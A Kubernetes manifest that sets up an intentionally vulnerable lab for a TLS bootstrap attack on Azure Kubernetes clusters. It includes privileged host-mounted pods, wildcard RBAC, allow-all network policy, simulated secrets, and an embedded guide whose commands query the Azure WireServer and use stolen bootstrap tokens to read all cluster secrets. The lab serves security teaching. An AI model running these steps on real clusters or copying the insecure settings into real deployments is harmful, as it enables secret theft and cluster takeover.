# TLS Bootstrap Attack on Azure Kubernetes Clusters Lab
# This lab demonstrates the vulnerability where an attacker with command execution
# in a pod can download the configuration used to provision the cluster node,
# extract the TLS bootstrap tokens, and perform a TLS bootstrap attack to read
# all secrets within the cluster.
apiVersion: v1
kind: Namespace
metadata:
  name: tls-bootstrap-lab
  labels:
    name: tls-bootstrap-lab
    purpose: tls-bootstrap-testing
    security-level: critical
    cloud-provider: azure
---
# VULNERABLE: Service account with excessive permissions for TLS bootstrap attack
apiVersion: v1
kind: ServiceAccount
metadata:
  name: tls-bootstrap-sa
  namespace: tls-bootstrap-lab
automountServiceAccountToken: true
---
# VULNERABLE: Overly permissive role for TLS bootstrap exploitation
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: tls-bootstrap-role
  namespace: tls-bootstrap-lab
rules:
- apiGroups: [""]
  resources: ["*"]
  verbs: ["*"]
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["*"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: tls-bootstrap-role-binding
  namespace: tls-bootstrap-lab
subjects:
- kind: ServiceAccount
  name: tls-bootstrap-sa
  namespace: tls-bootstrap-lab
roleRef:
  kind: Role
  name: tls-bootstrap-role
  apiGroup: rbac.authorization.k8s.io
---
# VULNERABLE: Pod with command execution capabilities for TLS bootstrap attack
# This simulates an attacker who has gained command execution in a pod
apiVersion: apps/v1
kind: Deployment
metadata:
  name: vulnerable-pod
  namespace: tls-bootstrap-lab
  labels:
    app: vulnerable-pod
    attack-vector: tls-bootstrap
spec:
  replicas: 1
  selector:
    matchLabels:
      app: vulnerable-pod
  template:
    metadata:
      labels:
        app: vulnerable-pod
        attack-vector: tls-bootstrap
    spec:
      serviceAccountName: tls-bootstrap-sa
      hostNetwork: true  # VULNERABLE: Host network access for Azure WireServer
      containers:
      - name: attacker-container
        image: alpine:latest
        command: ["/bin/sh"]
        args: ["-c", "while true; do sleep 3600; done"]
        env:
        - name: AZURE_WIRESERVER_URL
          value: "http://168.63.129.16"
        - name: PROVISIONING_SCRIPT_PATH
          value: "/var/lib/waagent/CustomData"
        - name: TLS_BOOTSTRAP_ENABLED
          value: "true"
        - name: ATTACK_VECTOR
          value: "tls-bootstrap-azure"
        securityContext:
          runAsUser: 0  # VULNERABLE: Running as root
          privileged: true  # VULNERABLE: Privileged container
          capabilities:
            add:
            - NET_ADMIN
            - NET_RAW
            - SYS_ADMIN
        volumeMounts:
        - name: host-filesystem
          mountPath: /host
          readOnly: false  # VULNERABLE: Writable host mount
        - name: azure-config
          mountPath: /var/lib/waagent
          readOnly: false  # VULNERABLE: Access to Azure agent config
      volumes:
      - name: host-filesystem
        hostPath:
          path: /
          type: Directory
      - name: azure-config
        hostPath:
          path: /var/lib/waagent
          type: DirectoryOrCreate
---
# VULNERABLE: Pod simulating Azure node with provisioning configuration
# This pod contains simulated Azure provisioning data that would normally
# be accessible via the Azure WireServer
apiVersion: apps/v1
kind: Deployment
metadata:
  name: azure-node-simulator
  namespace: tls-bootstrap-lab
  labels:
    app: azure-node-simulator
spec:
  replicas: 1
  selector:
    matchLabels:
      app: azure-node-simulator
  template:
    metadata:
      labels:
        app: azure-node-simulator
    spec:
      serviceAccountName: tls-bootstrap-sa
      containers:
      - name: wireserver-simulator
        image: nginx:alpine
        ports:
        - containerPort: 80
        env:
        - name: WIRESERVER_KEY
          value: "simulated-wireserver-key-for-lab"
        - name: BOOTSTRAP_TOKEN
          value: "simulated-bootstrap-token-xyz123"
        volumeMounts:
        - name: provisioning-data
          mountPath: /usr/share/nginx/html
      volumes:
      - name: provisioning-data
        configMap:
          name: azure-provisioning-config
---
# VULNERABLE: ConfigMap containing simulated Azure provisioning configuration
# In a real attack, this would be retrieved from Azure WireServer
apiVersion: v1
kind: ConfigMap
metadata:
  name: azure-provisioning-config
  namespace: tls-bootstrap-lab
data:
  CustomData: |
    #!/bin/bash
    # Simulated Azure node provisioning script
    # In real attack, this would contain TLS bootstrap tokens
    export KUBELET_BOOTSTRAP_TOKEN="simulated-bootstrap-token-xyz123"
    export CLUSTER_CA_CERT="LS0tLS1CRUdJTi..."
    export API_SERVER_URL="https://kubernetes.default.svc.cluster.local:443"
    # TLS Bootstrap configuration
    export TLS_BOOTSTRAP_ENABLED="true"
    export BOOTSTRAP_KUBECONFIG="/var/lib/kubelet/bootstrap-kubeconfig"
  wireserver.key: |
    # Simulated wireserver key
    # In real attack, this would be retrieved from Azure WireServer
    simulated-wireserver-key-for-lab
  provisioning.log: |
    [INFO] Node provisioning started
    [INFO] TLS Bootstrap token generated: simulated-bootstrap-token-xyz123
    [INFO] Cluster CA certificate configured
    [INFO] Kubelet bootstrap kubeconfig created
---
# VULNERABLE: Service exposing Azure WireServer simulator
apiVersion: v1
kind: Service
metadata:
  name: wireserver-simulator
  namespace: tls-bootstrap-lab
  labels:
    app: azure-node-simulator
spec:
  type: ClusterIP
  selector:
    app: azure-node-simulator
  ports:
  - port: 80
    targetPort: 80
    protocol: TCP
---
# VULNERABLE: Service exposing vulnerable pod
apiVersion: v1
kind: Service
metadata:
  name: vulnerable-pod
  namespace: tls-bootstrap-lab
  labels:
    app: vulnerable-pod
spec:
  type: NodePort
  selector:
    app: vulnerable-pod
  ports:
  - port: 8080
    targetPort: 8080
    nodePort: 30090
    protocol: TCP
---
# VULNERABLE: Secrets that would be accessible via TLS bootstrap attack
apiVersion: v1
kind: Secret
metadata:
  name: cluster-secrets
  namespace: tls-bootstrap-lab
type: Opaque
data:
  # base64 encoded secrets
  api-server-cert: LS0tLS1CRUdJTi...  # Simulated API server certificate
  etcd-key: c2ltdWxhdGVkLWV0Y2Qta2V5  # base64: simulated-etcd-key
  admin-token: c2ltdWxhdGVkLWFkbWluLXRva2Vu  # base64: simulated-admin-token
  bootstrap-token: c2ltdWxhdGVkLWJvb3RzdHJhcC10b2tlbi14eXoxMjM=  # base64: simulated-bootstrap-token-xyz123
---
# VULNERABLE: Additional secrets in different namespace (target for attack)
apiVersion: v1
kind: Secret
metadata:
  name: sensitive-secrets
  namespace: default
type: Opaque
data:
  database-password: c2ltdWxhdGVkLWRiLXBhc3N3b3Jk  # base64: simulated-db-password
  api-key: c2ltdWxhdGVkLWFwaS1rZXk=  # base64: simulated-api-key
  jwt-secret: c2ltdWxhdGVkLWp3dC1zZWNyZXQ=  # base64: simulated-jwt-secret
---
# VULNERABLE: ConfigMap with attack instructions and vulnerable configuration
apiVersion: v1
kind: ConfigMap
metadata:
  name: tls-bootstrap-attack-guide
  namespace: tls-bootstrap-lab
data:
  attack-description.md: |
    # TLS Bootstrap Attack on Azure Kubernetes Clusters
    
    ## Attack Overview
    An attacker with command execution in a pod running within an affected Azure
    Kubernetes Services (AKS) cluster can:
    1. Download the configuration used to provision the cluster node
    2. Extract the TLS bootstrap tokens
    3. Perform a TLS bootstrap attack to read all secrets within the cluster
    
    ## Attack Steps
    
    ### Step 1: Access Azure WireServer
    The Azure WireServer (168.63.129.16) is accessible from pods with host network access.
    This service provides node provisioning configuration.
    
    ```bash
    # From within the vulnerable pod
    curl http://168.63.129.16/go/Provisioning/GetProvisioningScript
    ```
    
    ### Step 2: Extract wireserver.key
    The wireserver.key is used to decrypt the provisioning script.
    
    ```bash
    # Access wireserver key (simulated in lab)
    cat /var/lib/waagent/wireserver.key
    ```
    
    ### Step 3: Decrypt Provisioning Script
    Decrypt the provisioning script to extract TLS bootstrap tokens.
    
    ```bash
    # Decrypt and extract bootstrap token
    # (In real attack, this would decrypt the CustomData)
    cat /var/lib/waagent/CustomData | grep BOOTSTRAP_TOKEN
    ```
    
    ### Step 4: Perform TLS Bootstrap
    Use the extracted bootstrap token to authenticate to the Kubernetes API server
    and read all secrets.
    
    ```bash
    # Use bootstrap token to access cluster
    kubectl --token=<bootstrap-token> get secrets --all-namespaces
    kubectl --token=<bootstrap-token> get secrets -n default
    ```
    
    ## Impact
    - Read all secrets in the cluster
    - Access sensitive configuration data
    - Potential for further privilege escalation
    - Complete cluster compromise
    
    ## Mitigation
    - Restrict host network access for pods
    - Implement network policies to block access to Azure WireServer
    - Use pod security policies to prevent privileged containers
    - Regularly rotate TLS bootstrap tokens
    - Monitor for unauthorized access to provisioning data
    - Implement least privilege access controls
    
  vulnerable-config.yaml: |
    # Vulnerable configuration that enables TLS bootstrap attack
    apiVersion: v1
    kind: Pod
    metadata:
      name: vulnerable-pod
    spec:
      hostNetwork: true  # VULNERABLE: Allows access to Azure WireServer
      containers:
      - name: attacker
        image: alpine:latest
        securityContext:
          privileged: true  # VULNERABLE: Privileged access
        volumeMounts:
        - name: azure-config
          mountPath: /var/lib/waagent  # VULNERABLE: Access to provisioning data
      volumes:
      - name: azure-config
        hostPath:
          path: /var/lib/waagent  # VULNERABLE: Host filesystem access
---
# VULNERABLE: NetworkPolicy that should block but doesn't (intentionally misconfigured)
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-all-tls-bootstrap
  namespace: tls-bootstrap-lab
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress
  ingress:
  - {}  # VULNERABLE: Allows all ingress
  egress:
  - {}  # VULNERABLE: Allows all egress (including Azure WireServer access)
---
# VULNERABLE: Pod Security Policy that should restrict but doesn't
# Note: PodSecurityPolicy is deprecated but shown for educational purposes
apiVersion: policy/v1beta1
kind: PodSecurityPolicy
metadata:
  name: permissive-tls-bootstrap
spec:
  privileged: true  # VULNERABLE: Allows privileged containers
  hostNetwork: true  # VULNERABLE: Allows host network access
  hostIPC: true
  hostPID: true
  volumes:
  - '*'
  allowedHostPaths:
  - pathPrefix: /
    readOnly: false  # VULNERABLE: Allows writable host path mounts
  runAsUser:
    rule: RunAsAny
  seLinux:
    rule: RunAsAny
  supplementalGroups:
    rule: RunAsAny
  fsGroup:
    rule: RunAsAny

